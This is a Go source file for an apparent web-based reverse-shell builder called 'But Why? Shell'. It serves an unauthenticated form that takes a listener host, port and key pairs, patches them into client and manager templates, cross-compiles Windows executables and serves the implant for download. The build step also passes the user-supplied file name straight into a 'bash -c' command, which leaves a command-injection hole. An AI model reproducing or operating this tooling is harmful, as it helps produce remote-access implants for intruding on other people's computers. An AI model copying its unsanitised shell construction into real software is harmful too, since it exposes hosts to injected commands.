package main

import (
	"bufio"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

var butytemplate *template.Template

type DownloadLink struct {
	Link string
}

var dwnloadlink DownloadLink

func init() {
	butytemplate = template.Must(template.ParseFiles("templates/buty.html"))
	dwnloadlink = DownloadLink{}

}

func main() {

	startserver()

	/*var lhost, lport, butyclientpvtkey, butyclientpubkey, butymngrpvtkey, butymngrpubkey, agentname string
	//redc := color.New(color.FgHiRed, color.Bold)
	//greenc := color.New(color.FgHiGreen, color.Bold)

	cyanc := color.New(color.FgCyan, color.Bold)
	yellowc := color.New(color.FgHiYellow, color.Bold)
	yellowc.Printf("\t\t\t\t ________________________________\n")
	yellowc.Printf("\t\t\t\t| The But Why ? Shell Builder ;) |\n")
	yellowc.Printf("\t\t\t\t --------------------------------\n\n")

	cyanc.Printf("SET LHOST >> ")
	reader := bufio.NewReader(os.Stdin)
	lhost, _ = reader.ReadString('\n')
	lhost = strings.TrimSuffix(lhost, "\r\n")

	cyanc.Printf("SET LPORT >> ")
	reader = bufio.NewReader(os.Stdin)
	lport, _ = reader.ReadString('\n')
	lport = strings.TrimSuffix(lport, "\r\n")

	cyanc.Printf("SET BUTY CLIENT PVT KEY >> ")
	reader = bufio.NewReader(os.Stdin)
	butyclientpvtkey, _ = reader.ReadString('\n')
	butyclientpvtkey = strings.TrimSuffix(butyclientpvtkey, "\r\n")

	cyanc.Printf("SET BUTY CLIENT PUBLIC KEY >> ")
	reader = bufio.NewReader(os.Stdin)
	butyclientpubkey, _ = reader.ReadString('\n')
	butyclientpubkey = strings.TrimSuffix(butyclientpubkey, "\r\n")

	cyanc.Printf("SET BUTY MANAGER PVT KEY >> ")
	reader = bufio.NewReader(os.Stdin)
	butymngrpvtkey, _ = reader.ReadString('\n')
	butymngrpvtkey = strings.TrimSuffix(butymngrpvtkey, "\r\n")

	cyanc.Printf("SET BUTY CLIENT PUBLIC KEY >> ")
	reader = bufio.NewReader(os.Stdin)
	butymngrpubkey, _ = reader.ReadString('\n')
	butymngrpubkey = strings.TrimSuffix(butymngrpubkey, "\r\n")

	cyanc.Printf("Save ButY Shell as >> ")
	reader = bufio.NewReader(os.Stdin)
	agentname, _ = reader.ReadString('\n')
	agentname = strings.TrimSuffix(agentname, "\r\n")

	updatetemplate("basefiles/butyclient.go", "basefiles/butyclient.go", lhost+":"+lport, butyclientpvtkey, butymngrpubkey)
	buildexe("download/"+agentname+".exe", "basefiles/butyclient.go")
	updatetemplate("basefiles/butymanager.go", "basefiles/butymanager.go", lport, butymngrpvtkey, butyclientpubkey)
	buildexe("download/butymanager.exe", "basefiles/butymanager.go")
	//os.Remove("download/butymanager.go")
	//os.Remove("download/butyclient.go") */
}

func updatetemplate(basefilepath, outfilepath, ipport, pvtkey, pubkey string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVPRT") {
			str = strings.Replace(str, "REVPRT", ipport, 1)
		}
		if strings.Contains(str, "IPPORT") {
			str = strings.Replace(str, "IPPORT", ipport, 1)
		}
		if strings.Contains(str, "BUTYMNGRPUBKEY") {
			str = strings.Replace(str, "BUTYMNGRPUBKEY", pubkey, 1)
		}
		if strings.Contains(str, "BUTYMNGRPVTKEY") {
			str = strings.Replace(str, "BUTYMNGRPVTKEY", pvtkey, 1)
		}
		if strings.Contains(str, "BUTYCLIENTPUBKEY") {
			str = strings.Replace(str, "BUTYCLIENTPUBKEY", pubkey, 1)
		}
		if strings.Contains(str, "BUTYCLIENTPVTKEY") {
			str = strings.Replace(str, "BUTYCLIENTPVTKEY", pvtkey, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func copyfile(sourcepath, destpath string) {
	srcpubkfile, err := os.Open(sourcepath)
	if err != nil {
		fmt.Println(err)
	}
	defer srcpubkfile.Close()
	newpubkFile, err := os.Create(destpath)
	if err != nil {
		fmt.Println(err)
	}
	defer newpubkFile.Close()

	scanner := bufio.NewScanner(srcpubkfile)
	for scanner.Scan() {
		str := scanner.Text()

		newpubkFile.WriteString(str + "\n")
	}

	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func butyindex(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := butytemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		lhost := req.Form.Get("lhost")
		lport := req.Form.Get("lport")
		butyclientpvtkey := req.Form.Get("shellpvtkey")
		butyclientpubkey := req.Form.Get("shellpubkey")
		butymngrpvtkey := req.Form.Get("mngrpvtkey")
		butymngrpubkey := req.Form.Get("mngrpubkey")

		updatetemplate("basefiles/butwhyclient.go", "download/butwhyclient.go", lhost+":"+lport, butyclientpvtkey, butymngrpubkey)
		buildexe("download/"+saveas+".exe", "download/butwhyclient.go")
		updatetemplate("basefiles/butwhymanager.go", "download/butwhymanager.go", lport, butymngrpvtkey, butyclientpubkey)
		buildexe("download/butymanager.exe", "download/butwhymanager.go")

		time.Sleep(5000 * time.Millisecond)
		dwnloadlink.Link = "download/" + saveas + ".exe"
		os.Remove("download/butwhymanager.go")
		os.Remove("download/butwhyclient.go")
		err = butytemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func startserver() {
	router := mux.NewRouter()
	router.HandleFunc("/", butyindex)
	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
	router.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
	router.PathPrefix("/outfiles/").Handler(http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))

	srv := &http.Server{
		Handler: router,
		Addr:    "0.0.0.0:8085",
		// Good practice: enforce timeouts for servers you create!
		WriteTimeout: 180 * time.Second,
		ReadTimeout:  180 * time.Second,
	}
	srv.ListenAndServe()
}

func buildexe(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}
